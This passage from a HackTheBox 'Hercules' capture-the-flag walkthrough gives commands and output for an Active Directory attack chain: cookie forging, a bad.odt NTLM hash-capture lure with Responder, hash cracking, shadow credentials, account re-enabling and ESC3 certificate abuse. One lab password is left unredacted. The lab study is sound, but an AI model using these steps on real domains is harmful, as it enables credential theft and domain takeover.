drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 pritesh.m
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 rafique.a
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 ramona.l
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 ranjana.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 ray.n
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 renata.o
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 rene.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 rizwana.k
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 rubal.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 saif.h
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 sandipan.d
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 satinder.p
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 shae.j
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 shantanu.m
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 shikha.c
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 silver.r
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 song.b
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 stephanie.w
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 stephen.m
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 subash.k
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 sunita.r
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 talwinder.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 tanya.r
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 taylor.m
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 tere.g
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 tish.c
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 tulsi.p
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 vara.p
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 vincent.g
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 virender.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 web_admin
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 will.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 winda.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 yomna.a
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 zeke.s
```

We now really have ALL users on this domain.

In the download page you can read the `web.config` using the [Local File Inclusion (LFI)](../../../3%20-%20Tags/Hacking%20Concepts/Local%20File%20Inclusion%20(LFI).md) vulnerability and craft a cookie for new admin user, you can use this  [script](https://github.com/investigato/SnackOverflow "https://github.com/investigato/SnackOverflow") or make your own:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Hercules/user/CookieBaker]
└─$ dotnet run CookieBaker.cs 

We baking a cookie for: CookieBaker.cs
Group: Web Administrators

Forms Auth Cookie Value: C8FD50228B817DFCEAA5F4A43F2FF14504826B10DD6BEC1E2C3504EC228457EB350A94572346D4A59A4371439F40A092C82969AD1831BDFD91F0C23B3C18AD6AF364C3B07099100BD8312E84073BADA25DDBCE6810BF6A5CA113B5B08DA4EA HTB{REDACTED_COOKIE}
Cookie Name: .ASPXAUTH
User: CookieBaker.cs
Group: Web Administrators
Cookie Length: 384 chars
```

Now we access web and change `.ASPXAUTH` with [Developer tools](../../../3%20-%20Tags/Hacking%20Concepts/Developer%20tools.md) and reload.
## web_admin to natalie.a

Now we can use file upload for hash stealing. found that only file type accepted are  `.docx` and `.odt`, we can use [Metasploit-Framework (MSF)](../../../3%20-%20Tags/Hacking%20Tools/Metasploit-Framework%20(MSF).md) module for a `bad.odt` file:

```bash
msf auxiliary(fileformat/odt_badodt) > options

Module options (auxiliary/fileformat/odt_badodt):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CREATOR   Johnathan        yes       Document author for new document
   FILENAME  salary.odt       yes       Filename for the new document
   LHOST     10.10.14.146     yes       IP Address of SMB Listener that the .odt document points to


View the full module info with the info, or info -d command.

msf auxiliary(fileformat/odt_badodt) > run
```

Start [Responder](../Starting%20Point/Tier%201/Responder.md) and upload the file in the form:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Hercules/user/scripts]
└─$ sudo responder -I tun0

[+] Listening for events...                                                                            

[SMB] NTLMv2-SSP Client   : 10.10.11.91
[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:90ef055258e7e00b:73ECEFECD10E1E99F8B20F6A44AEE77B: HTB{REDACTED_HASH}
```

Crack it with [JohnTheRipper](../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ john natalie.hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
HTB{REDACTED_PASSWD} (natalie.a)     
1g 0:00:00:02 DONE (2025-10-20 18:25) 0.3676g/s 3941Kp/s 3941Kc/s 3941KC/s Q+#(Q..Pongo27
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
## natalie.a to bob.w

Now we request a ticket for `natalie.a`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ impacket-getTGT hercules.htb/'natalie.a':'HTB{REDACTED_PASSWD}' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in natalie.a.ccache                                                                      

─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Hercules/user/natalie.  
```

[SMB](../../../3%20-%20Tags/Hacking%20Concepts/SMB.md) again:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ impacket-smbclient -k dc.hercules.htb

# use Department
# ls
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 .
drw-rw-rw-          0  Wed Dec  4 02:45:11 2024 ..
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 Engineering Department
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 IT
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 Recruitment
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 Security Department
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 Web Department
# cd IT
# ls
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 .
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 ..
-rw-rw-rw-       1048  Wed Dec  4 02:45:12 2024 cleanup.lnk
-rw-rw-rw-        935  Wed Dec  4 02:47:11 2024 notice.eml
# get notice.eml
# get cleanup.lnk
```

We can see the files in `Department/IT`, we `get` them and then `cat` to read the content:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ cat notice.eml  
--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
Content-Type: multipart/alternative;
        boundary="_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_"

--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
________________________________
From: Ashley Browne
Sent: Tuesday 10:17:27 AM
To: IT Support <HERCULES\IT Support@HERCULES.HTB>
Subject: Password Reset

Hey Team,

The Administration has provided a solution to much of the permission issues
some of you have been facing.

If you are having problems changing a password, the instructions are:

1) Check AD Permissions against the user.
2) Run the shortcut provided in the share.
3) Try to reset the password again.

If all else fails, send me a message.

Regards, Ashley.

--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
```

Very interesting, we can change passwords.
### Bloodhound

We collect again to examine our `AD Permissions`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ nxc ldap dc.hercules.htb -u 'natalie.a' -p 'HTB{REDACTED_PASSWD}' --bloodhound --collection All --dns-server 10.10.11.91 -k      
LDAP        dc.hercules.htb 389    DC               [*] None (name:DC) (domain:hercules.htb)
LDAP        dc.hercules.htb 389    DC               [+] hercules.htb\natalie.a:Prettyprincess123! 
LDAP        dc.hercules.htb 389    DC               Resolved collection methods: group, session, psremote, container, localadmin, dcom, rdp, trusts, objectprops, acl
LDAP        dc.hercules.htb 389    DC               Using kerberos auth without ccache, getting TGT
LDAP        dc.hercules.htb 389    DC               Done in 00M 11S
LDAP        dc.hercules.htb 389    DC               Compressing output into /home/mdn0x/.nxc/logs/DC_dc.hercules.htb_2025-10-20_203704_bloodhound.zip
```

GUI:

![Pasted image 20251020191115.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251020191115.png)

We don't have outbound objects for `natalie.a`.
### Rusthound-CE

Apparently, using `rusthound-ce` we have 11 **outbound objects** for `natalie.a`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ rusthound-ce -d HERCULES.HTB -u natalie.a@hercules.htb  -p 'HTB{REDACTED_PASSWD}' -k -z -f DC.HERCULES.HTB 

---------------------------------------------------
Initializing RustHound-CE at 21:51:00 on 10/20/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-10-20T19:51:00Z INFO  rusthound_ce] Verbosity level: Info
[2025-10-20T19:51:00Z INFO  rusthound_ce] Collection method: All
```

![Pasted image 20251020221541.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251020221541.png)

Now we can see a path here.
### GenericWrite on bob.w

We have `GenericWrite` permissions on different users, `bob.w` is the most interesting because he's member of `Recruitment Managers`.
#### Certipy shadow-credentials attack

https://www.hackingarticles.in/shadow-credentials-attack/

**GenericWrite** or **GenericAll** are required to modify the **msDS-KeyCredentialLink** attribute:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ certipy-ad shadow auto -u 'natalie.a@hercules.htb' -p 'HTB{REDACTED_PASSWD}' -account 'bob.w' -dc-ip '10.10.11.91' -dc-host dc.hercules.htb -k
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Targeting user 'bob.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '4b19fda9b47b44c682626fa771be7453'
[*] Adding Key Credential with device ID '4b19fda9b47b44c682626fa771be7453' to the Key Credentials for 'bob.w'
[*] Successfully added Key Credential with device ID '4b19fda9b47b44c682626fa771be7453' to the Key Credentials for 'bob.w'
[*] Authenticating as 'bob.w' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'bob.w@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bob.w.ccache'
[*] Wrote credential cache to 'bob.w.ccache'
[*] Trying to retrieve NT hash for 'bob.w'
[*] Restoring the old Key Credentials for 'bob.w'
[*] Successfully restored the old Key Credentials for 'bob.w'
[*] NT hash for 'bob.w': HTB{REDACTED_HASH}
```

So we have a ticket for `bob.w`, let's check his privileges:

![Pasted image 20251021110313.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251021110313.png)
## Bob.w to Auditor

We use `bob.w` to update `auditor` **OU** (SECURITY DEPARTMENT) to WEB DEPARTMENT then we are able to use again `natalie.a` to get auditor hash.

Use `ldapmodify` to change **OU**, you can use `-Y` to specify the authentication method if you are using Kerberos, try running the command without the `-x` flag, as it forces simple authentication and might conflict with `-Y GSSAPI`:

```bash
─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Hercules/user/bob.w.ccache   
─$ nano move-auditor.ldif
─$ cat move-auditor.ldif 
dn: CN=AUDITOR,OU=SECURITY DEPARTMENT,OU=DCHERCULES,DC=HERCULES,DC=HTB
changetype: modrdn
newrdn: CN=AUDITOR
deleteoldrdn: 1
newsuperior: OU=WEB DEPARTMENT,OU=DCHERCULES,DC=HERCULES,DC=HTB

ldapmodify -H ldap://10.10.11.91 -Y GSSAPI -f move-auditor.ldif
```

And `certipy` again for shadow credentials attack:

```bash
export KRB5CCNAME=../../natalie.a.ccache

certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account auditor

Certipy v5.0.3 - by Oliver Lyak (ly4k) 
[!] Target name (-target) not specified and Kerberos authentication is used. This might fail 
[!] DNS resolution failed: The DNS query name does not exist: DC.hercules.htb. 
[!] Use -debug to print a stacktrace [*] Targeting user 'auditor' [*] Generating certificate [*] Certificate generated [*] Generating Key Credential 
[*] Key Credential generated with DeviceID '6e30703488f642a38baa84e17c8ff033' 
[*] Adding Key Credential with device ID '6e30703488f642a38baa84e17c8ff033' to the Key Credentials for 'auditor' 
[*] Successfully added Key Credential with device ID '6e30703488f642a38baa84e17c8ff033' to the Key Credentials for 'auditor' 
[*] Authenticating as 'auditor' with the certificate [*] Certificate identities: 
[*] No identities found in this certificate 
[*] Using principal: 'auditor@hercules.htb' 
[*] Trying to get TGT... 
[*] Got TGT 
[*] Saving credential cache to 'auditor.ccache' 
[*] Wrote credential cache to 'auditor.ccache' 
[*] Trying to retrieve NT hash for 'auditor' 
[*] Restoring the old Key Credentials for 'auditor' 
[*] Successfully restored the old Key Credentials for 'auditor' 
[*] NT hash for 'auditor': HTB{REDACTED_HASH}
```

We have now `auditor` hash and a ticket.
## Auditor to fernando.r

`auditor`  is member of `REMOTE MANAGEMENT USERS` so we can use `evil_winrmexec`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ impacket-getTGT hercules.htb/auditor:HTB{REDACTED_HASH} -hashes :HTB{REDACTED_HASH} -dc-ip 10.10.11.91
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in auditor.ccache

-$ git clone https://github.com/ozelis/winrmexec.git 

-$ python3 evil_winrmexec.py hercules.htb/auditor@dc.hercules.htb -k -no-pass -ssl -port 5986      # export the ticket for auditor before this command (-k)
```

Now flag:

```bash
PS C:\Users\auditor\Documents> cd ../Desktop
PS C:\Users\auditor\Desktop> ls

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---        10/21/2025   7:28 PM             34 user.txt

PS C:\Users\auditor\Desktop> type user.txt
HTB{REDACTED_FLAG}
HTB{REDACTED_FLAG}
HTB{REDACTED_FLAG}       # flags change multiple times
```

Got `user.txt` finally !!

Collect again:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ bloodhound-python -u auditor -k -no-pass -d hercules.htb -ns 10.10.11.91 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hercules.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 6 computers
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 50 users
INFO: Found 62 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc.hercules.htb
INFO: Done in 00M 11S
INFO: Compressing output into 20251021141622_bloodhound.zip
```

![Pasted image 20251021141828.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251021141828.png)

So we have `GenericAll` on `fernando.r` so we can change his password, but his account is disabled, so we have to enable it, we can do it from our shell:

```bash
# Check if the current user has admin privileges
([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

False

PS C:\> Import-Module ActiveDirectory
Get-ADOrganizationalUnit -Filter * | Select-Object Name, DistinguishedName

Name                   DistinguishedName                                         
----                   -----------------                                         
Domain Controllers     OU=Domain Controllers,DC=hercules,DC=htb                  
DCHERCULES             OU=DCHERCULES,DC=hercules,DC=htb                          
Forest Migration       OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb      
DC Computers           OU=DC Computers,OU=DCHERCULES,DC=hercules,DC=htb          
IIS Service Users      OU=IIS Service Users,OU=DCHERCULES,DC=hercules,DC=htb     
Domain Groups          OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb         
Hades Employees        OU=Hades Employees,OU=DCHERCULES,DC=hercules,DC=htb       
Engineering Department OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
Security Department    OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb   
Web Department         OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb  
```

Use `auditor` to enable `fernando.r`:

```bash
PS C:\> Get-ADUser -Identity "fernando.r" -Properties Enabled, MemberOf         # verify if enabled (bloodhound said no)


DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Fernando
MemberOf          : {CN=Smartcard Operators,OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb, CN=Domain 
                    Employees,OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb}
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb

## Add GenericAll on OU

└─$ bloodyAD -d hercules.htb --host "dc.hercules.htb" -k --dc-ip 10.10.11.91 --dns 10.10.11.91 add genericAll "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" auditor
[+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

## Enable account and Change passwd

PS C:\Users\auditor\Documents> Set-ADUser -Identity "fernando.r" -Enabled $true

PS C:\Users\auditor\Documents> Get-ADUser -Identity "fernando.r" -Properties Enabled, MemberOf

DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : True
GivenName         : Fernando
MemberOf          : {CN=Smartcard Operators,OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb, CN=Domain 
                    Employees,OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb}
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb

PS C:\Users\auditor\Documents> Set-ADAccountPassword -Identity "fernando.r" -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword123!" -Force) -Reset
```

Request TGT:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ impacket-getTGT hercules.htb/'fernando.r':'NewPassword123!'                  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in fernando.r.ccache
```

The user is disabled after a short time so keep the auditor shell open and redo commands if needed through the process.
## fernando.r to ashley.b

Bloodhound check:

![Pasted image 20251021155817.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251021155817.png)

The members of the group `SMARTCARD OPERATORS` have the capability to perform the `ADCS ESC3` attack against the domain `HERCULES.HTB`.
### ESC3

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template

https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/

Find vulnerable templates / list templates:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ certipy-ad find -u 'fernando.r@hercules.htb' -p 'NewPassword123!' -dc-ip '10.10.11.91' -k -target dc.hercules.htb -vulnerable -enabled

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'CA-HERCULES' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'CA-HERCULES'
[*] Checking web enrollment for CA 'CA-HERCULES' @ 'dc.hercules.htb'
[*] Saving text output to '20251021181123_Certipy.txt'
[*] Wrote text output to '20251021181123_Certipy.txt'
[*] Saving JSON output to '20251021181123_Certipy.json'
[*] Wrote JSON output to '20251021181123_Certipy.json'

─$ cat 20251021181309_Certipy.json 
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "CA-HERCULES",
      "DNS Name": "dc.hercules.htb",
      "Certificate Subject": "CN=CA-HERCULES, DC=hercules, DC=htb",
      "Certificate Serial Number": "1DD5F287C078F9924ED52E93ADFA1CCB",
      "Certificate Validity Start": "2024-12-04 01:34:17+00:00",
      "Certificate Validity End": "2034-12-04 01:44:17+00:00",
      "Web Enrollment": {
        "http": {
          "enabled": false
        },
        "https": {
          "enabled": false,
          "channel_binding": null
        }
      },
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Active Policy": "CertificateAuthority_MicrosoftDefault.Policy",
      "Permissions": {
        "Owner": "HERCULES.HTB\\Administrators",
        "Access Rights": {
          "1": [
            "HERCULES.HTB\\Administrators",
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ],
          "2": [
            "HERCULES.HTB\\Administrators",
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ],
          "512": [
            "HERCULES.HTB\\Authenticated Users"
          ]
        }
      }
    }
  },
  "Certificate Templates": {
    "0": {
      "Template Name": "MachineEnrollmentAgent",
      "Display Name": "Enrollment Agent (Computer)",
      "Certificate Authorities": [
        "CA-HERCULES"
      ],
      "Enabled": true,
      "Client Authentication": false,
      "Enrollment Agent": true,
      "Any Purpose": false,
      "Enrollee Supplies Subject": false,
      "Certificate Name Flag": [
        134217728,
        268435456
      ],
      "Enrollment Flag": [
        32
      ],
      "Extended Key Usage": [
        "Certificate Request Agent"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Schema Version": 1,
      "Validity Period": "2 years",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Template Created": "2024-12-04 01:44:26+00:00",
      "Template Last Modified": "2024-12-04 01:44:51+00:00",
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "HERCULES.HTB\\Smartcard Operators",
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ]
        },
        "Object Control Permissions": {
          "Owner": "HERCULES.HTB\\Enterprise Admins",
          "Full Control Principals": [
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ],
          "Write Property Enroll": [
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ]
        }
      },
      "[+] User Enrollable Principals": [
        "HERCULES.HTB\\Smartcard Operators"
      ],
      "[!] Vulnerabilities": {
        "ESC3": "Template has Certificate Request Agent EKU set."
      }
    },
    "1": {
      "Template Name": "EnrollmentAgentOffline",
      "Display Name": "Exchange Enrollment Agent (Offline request)",
      "Certificate Authorities": [
        "CA-HERCULES"
      ],
      "Enabled": true,
      "Client Authentication": false,
      "Enrollment Agent": true,
      "Any Purpose": false,
      "Enrollee Supplies Subject": true,
      "Certificate Name Flag": [
        1
      ],
      "Extended Key Usage": [
        "Certificate Request Agent"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Schema Version": 1,
      "Validity Period": "2 years",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Template Created": "2024-12-04 01:44:26+00:00",
      "Template Last Modified": "2024-12-04 01:44:51+00:00",
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "HERCULES.HTB\\Smartcard Operators",
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ]
        },
        "Object Control Permissions": {
          "Owner": "HERCULES.HTB\\Enterprise Admins",
          "Full Control Principals": [
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ],
          "Write Property Enroll": [
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ]
        }
      },
      "[+] User Enrollable Principals": [
        "HERCULES.HTB\\Smartcard Operators"
      ],
      "[!] Vulnerabilities": {
        "ESC3": "Template has Certificate Request Agent EKU set.",
        "ESC15": "Enrollee supplies subject and schema version is 1."
      },
      "[*] Remarks": {
        "ESC15": "Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details."
      }
    },
    "2": {
      "Template Name": "EnrollmentAgent",
      "Display Name": "Enrollment Agent",
      "Certificate Authorities": [
        "CA-HERCULES"
      ],
      "Enabled": true,
      "Client Authentication": false,
      "Enrollment Agent": true,
      "Any Purpose": false,
      "Enrollee Supplies Subject": false,
      "Certificate Name Flag": [
        33554432,
        2147483648
      ],
      "Enrollment Flag": [
        32
      ],
      "Extended Key Usage": [
        "Certificate Request Agent"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Schema Version": 1,
      "Validity Period": "2 years",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Template Created": "2024-12-04 01:44:26+00:00",
      "Template Last Modified": "2024-12-04 01:44:51+00:00",
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "HERCULES.HTB\\Smartcard Operators",
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ]
        },
        "Object Control Permissions": {
          "Owner": "HERCULES.HTB\\Enterprise Admins",
          "Full Control Principals": [
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ],
          "Write Property Enroll": [
            "HERCULES.HTB\\Domain Admins",
            "HERCULES.HTB\\Enterprise Admins"
          ]
        }
      },
      "[+] User Enrollable Principals": [
        "HERCULES.HTB\\Smartcard Operators"
      ],
      "[!] Vulnerabilities": {
        "ESC3": "Template has Certificate Request Agent EKU set."
      }
    }
  }
}                          
```

From `json` output the templates that are explicitly marked **ESC3** are:

- `EnrollmentAgent`
- `EnrollmentAgentOffline`
- `MachineEnrollmentAgent`

`EnrollmentAgent` is the usual first choice for an `ESC3` attack (it has the **Certificate Request Agent** EKU, which `Certipy` flagged)

**Step 1**: Use `Certipy` to request an enrollment agent certificate.

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-host dc.hercules.htb -dc-ip 10.10.11.91 -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "EnrollmentAgent" -application-policies "Certificate Request Agent"
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'fernando.r@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1121'
[*] Saving certificate and private key to 'fernando.r.pfx'
File 'fernando.r.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'fernando.r.pfx'
```

**Step 2**: Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allow for authentication and permit enrollment agent enrollment:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "User" -pfx fernando.r.pfx -on-behalf-of "hercules\ashley.b" -dcom
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'ashley.b@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Saving certificate and private key to 'ashley.b.pfx'
[*] Wrote certificate and private key to 'ashley.b.pfx'
```

**Step 3**: authenticate:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/root]
└─$ certipy-ad auth -pfx 'ashley.b.pfx' -dc-ip '10.10.11.91'
